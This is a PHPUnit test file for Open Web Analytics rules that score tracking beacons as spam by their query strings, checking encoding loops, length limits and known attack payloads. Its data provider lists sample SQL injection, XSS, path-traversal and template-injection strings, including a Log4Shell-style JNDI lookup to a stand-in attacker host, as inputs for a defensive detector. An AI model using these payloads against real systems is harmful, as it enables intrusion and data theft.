<?php

use PHPUnit\Framework\TestCase;

require_once __DIR__ . '/bootstrap_owa.php';

use OWA\Module\Base\Classes\Spam\Received;
use OWA\Module\Base\Classes\Spam\Rules\QueryEncodingLoop;
use OWA\Module\Base\Classes\Spam\Rules\QueryLong;
use OWA\Module\Base\Classes\Spam\Rules\QueryVeryLong;
use OWA\Module\Base\Classes\Spam\Rules\QueryAttackPayload;

/**
 * The query_string rule set, on the page URL and its referrer as the beacon
 * carried them.
 */
final class SpamQueryStringRulesTest extends TestCase
{
    /** The 4 November attack's page URL. */
    const ATTACK_URL = 'https://www.openwebanalytics.com/?amp%25252525252525252525252525253Butm_campaign%3Dinflu_salesplayers';

    private function event(string $page, string $referrer = ''): object
    {
        $event = new \OWA\Module\Base\Classes\Event();
        $event->setEventType('page_view');
        $event->set('received_page_location', $page);

        if ($referrer !== '') {
            $event->set('received_referer', $referrer);
        }

        return $event;
    }

    private function fires(string $rule, string $page, string $referrer = ''): bool
    {
        return (new $rule())->test($this->event($page, $referrer), []);
    }

    /** A page URL whose query string is exactly $n characters. */
    private static function withQuery(int $n): string
    {
        return 'https://example.com/search?' . str_pad('q=', $n, 'a');
    }

    // ---- what is read -----------------------------------------------------

    public function testTheReceivedCopyIsReadBeforeTheProperty(): void
    {
        $event = new \OWA\Module\Base\Classes\Event();
        $event->set('page_location', 'https://example.com/cleaned');
        $event->set('received_page_location', 'https://example.com/as-sent');

        $this->assertSame('https://example.com/as-sent', Received::pageLocation($event));

        $event = new \OWA\Module\Base\Classes\Event();
        $event->set('page_location', 'https://example.com/only');
        $event->set('HTTP_REFERER', 'https://ref.example/');

        $this->assertSame('https://example.com/only', Received::pageLocation($event), 'an event from before the copy');
        $this->assertSame('https://ref.example/', Received::referrer($event));
    }

    /** The edge's copy is taken before the property stage cleans the URL. */
    public function testTheEdgeCopiesTheUrlsAsTheyArrived(): void
    {
        $raw   = "https://example.com/?q=<script>alert('x')</script>&v=\${jndi:ldap://x}";
        $event = new \OWA\Module\Base\Classes\Event();
        $event->set('page_location', $raw);
        $event->set('HTTP_REFERER', 'https://ref.example/?a=1');

        $this->assertSame($raw, \OWA\Module\Base\Classes\TrackingEventHelpers::receivedPageLocation(null, $event));
        $this->assertSame('https://ref.example/?a=1', \OWA\Module\Base\Classes\TrackingEventHelpers::receivedReferer(null, $event));
    }

    public function testAQueryStringEndsAtTheFragment(): void
    {
        $this->assertSame('a=1&b=2', Received::query('https://example.com/p?a=1&b=2#top'));
        $this->assertSame('', Received::query('https://example.com/p#top'));
    }

    // ---- QUERY_ENCODING_LOOP ----------------------------------------------

    public function testTheAttackUrlIsAnEncodingLoop(): void
    {
        $this->assertTrue($this->fires(QueryEncodingLoop::class, self::ATTACK_URL));
    }

    public function testThreeTimesOverFiresAndTwiceDoesNot(): void
    {
        $this->assertTrue($this->fires(QueryEncodingLoop::class, 'https://example.com/?u=%252525'));
        $this->assertTrue($this->fires(QueryEncodingLoop::class, 'https://example.com/?u=%2525253a'), 'lower case, and what follows');
        $this->assertTrue($this->fires(QueryEncodingLoop::class, 'https://example.com/?u=%25252525'));
        $this->assertFalse($this->fires(QueryEncodingLoop::class, 'https://example.com/?u=%25253A'), 'encoded twice');
        $this->assertFalse($this->fires(QueryEncodingLoop::class, 'https://example.com/?u=%253A'), 'encoded once');
        $this->assertFalse($this->fires(QueryEncodingLoop::class, 'https://example.com/?u=a%20b'));
    }

    public function testTheReferrerIsReadToo(): void
    {
        $this->assertTrue($this->fires(QueryEncodingLoop::class, 'https://example.com/', 'https://ref.example/?r=%252525'));
    }

    // ---- QUERY_LONG and QUERY_VERY_LONG ------------------------------------

    public function testTheLengthBoundaries(): void
    {
        foreach ([
            200 => [false, false],
            201 => [true, false],
            500 => [true, false],
            501 => [false, true],
        ] as $n => [$long, $very]) {
            $url = self::withQuery($n);

            $this->assertSame($n, strlen(Received::query($url)));
            $this->assertSame($long, $this->fires(QueryLong::class, $url), "QUERY_LONG at $n");
            $this->assertSame($very, $this->fires(QueryVeryLong::class, $url), "QUERY_VERY_LONG at $n");
        }
    }

    public function testALongReferrerIsNotALongQuery(): void
    {
        $this->assertFalse($this->fires(QueryLong::class, 'https://example.com/', self::withQuery(300)));
    }

    // ---- QUERY_ATTACK_PAYLOAD ---------------------------------------------

    /** @dataProvider payloads */
    public function testEachPayloadFamilyRawAndEncoded(string $family, string $payload): void
    {
        $this->assertTrue($this->fires(QueryAttackPayload::class, 'https://example.com/?q=' . $payload), "$family, raw");
        $this->assertTrue($this->fires(QueryAttackPayload::class, 'https://example.com/?q=' . rawurlencode($payload)), "$family, encoded");
        $this->assertTrue($this->fires(QueryAttackPayload::class, 'https://example.com/', 'https://ref.example/?q=' . rawurlencode($payload)),
            "$family, in the referrer");

        $this->assertSame($family, QueryAttackPayload::match($payload)[0] ?? null);
    }

    public static function payloads(): array
    {
        return [
            'union select'       => ['sql', '1 UNION SELECT password FROM users'],
            'union all select'   => ['sql', '1 union all select 1,2'],
            'union+select'       => ['sql', '1+union+select+1'],
            'sleep('             => ['sql', "1' AND SLEEP(5)--"],
            'benchmark('         => ['sql', '1 and benchmark(5000000,md5(1))'],
            'waitfor delay'      => ['sql', "1'; WAITFOR DELAY '0:0:5'--"],
            'information_schema' => ['sql', '1 and 1=(select 1 from information_schema.tables)'],
            "' or '1'='1"        => ['sql', "admin' or '1'='1"],
            "'or'1'='1"          => ['sql', "x'or'1'='1"],
            "' or 1=1"           => ['sql', "x' or 1=1--"],
            '<script'            => ['script', '<script>alert(1)</script>'],
            'javascript:'        => ['script', 'javascript:alert(1)'],
            'onerror='           => ['script', 'x onerror=alert(1)'],
            'onload='            => ['script', 'x onload=alert(1)'],
            '<svg'               => ['script', '<svg/onload=alert(1)>'],
            '../'                => ['traversal', '../../../config.php'],
            '%2e%2e%2f'          => ['traversal', '%2E%2E%2Fconfig.php'],
            '/etc/passwd'        => ['traversal', 'file:///etc/passwd'],
            'win.ini'            => ['traversal', 'c:\\windows\\win.ini'],
            '${jndi:'            => ['template', '${jndi:ldap://evil.example/a}'],
            '${'                 => ['template', '${7*7}'],
            '{{...}}'            => ['template', '{{7*7}}'],
        ];
    }

    public function testOrdinaryUrlsCarryNoPayload(): void
    {
        foreach ([
            'https://www.example.com/search?q=how+to+install+open+web+analytics+on+ubuntu&page=2&sort=relevance',
            'https://www.example.com/blog/2026/11/union-station-photos?utm_source=newsletter&utm_medium=email',
            'https://www.example.com/products/sleep-mask?color=blue&size=m',
            'https://shop.example.com/cart?item=it%27s-a-gift&qty=1',
            'https://www.example.com/?q=rock+%27n%27+roll+or+jazz',
            'https://www.example.com/docs/en/onboarding?step=2',
            'https://www.example.com/price?amount=%2450',
        ] as $url) {
            $this->assertFalse($this->fires(QueryAttackPayload::class, $url), $url);
            $this->assertFalse($this->fires(QueryEncodingLoop::class, $url), $url);
        }
    }

    // ---- the set as a whole -----------------------------------------------

    public function testTheSetsRulesAndPoints(): void
    {
        $found = [];

        foreach (\OWA\Module\Base\Classes\Spam\RuleSets::SETS['query_string'] as $class) {
            $rule = new $class();
            $this->assertSame('query_string', $rule->set());
            $found[$rule->name()] = $rule->points();
        }

        $this->assertSame(['QUERY_ENCODING_LOOP' => 3.0, 'QUERY_LONG' => 1.0, 'QUERY_VERY_LONG' => 2.0, 'QUERY_ATTACK_PAYLOAD' => 5.0], $found);
    }

    /** A normal long search URL, under 200, scores 0 on the whole set. */
    public function testANormalSearchUrlScoresZero(): void
    {
        $url = 'https://www.example.com/search?q=how+to+install+open+web+analytics+on+ubuntu+with+mariadb+and+nginx&page=2&sort=relevance&lang=en';

        $this->assertLessThan(200, strlen(Received::query($url)));

        foreach (\OWA\Module\Base\Classes\Spam\RuleSets::SETS['query_string'] as $class) {
            $this->assertFalse((new $class())->test($this->event($url), []), $class);
        }
    }

    /** The two length rules never fire together. */
    public function testLongAndVeryLongAreExclusive(): void
    {
        foreach ([150, 201, 350, 500, 501, 2000] as $n) {
            $url = self::withQuery($n);
            $this->assertFalse($this->fires(QueryLong::class, $url) && $this->fires(QueryVeryLong::class, $url), (string) $n);
        }
    }
}
